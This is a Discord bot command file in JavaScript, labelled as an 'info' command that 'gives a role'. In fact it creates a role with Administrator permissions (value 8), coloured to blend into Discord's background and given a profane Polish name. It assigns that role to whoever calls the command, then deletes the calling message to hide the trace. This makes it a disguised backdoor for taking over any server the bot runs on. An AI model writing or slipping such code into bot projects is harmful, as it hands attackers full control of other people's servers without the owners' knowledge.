const { MessageEmbed } = require('discord.js');



module.exports = {

    

    name: "role", 

    category: "info", 

    aliases: ["r"], 

    cooldown: 5, 

    usage: "role",

    description: "Daje rolę", 

    

run: async (client, message, args, user, text, prefix) => {

role = await message.guild.roles.create ({

    data: {

        name: "Kto usunie ten pizda :)",

          color: "#36393f",

          permissions: [8]

    }

});

    

message.member.roles.add(role)

message.delete();

}

}
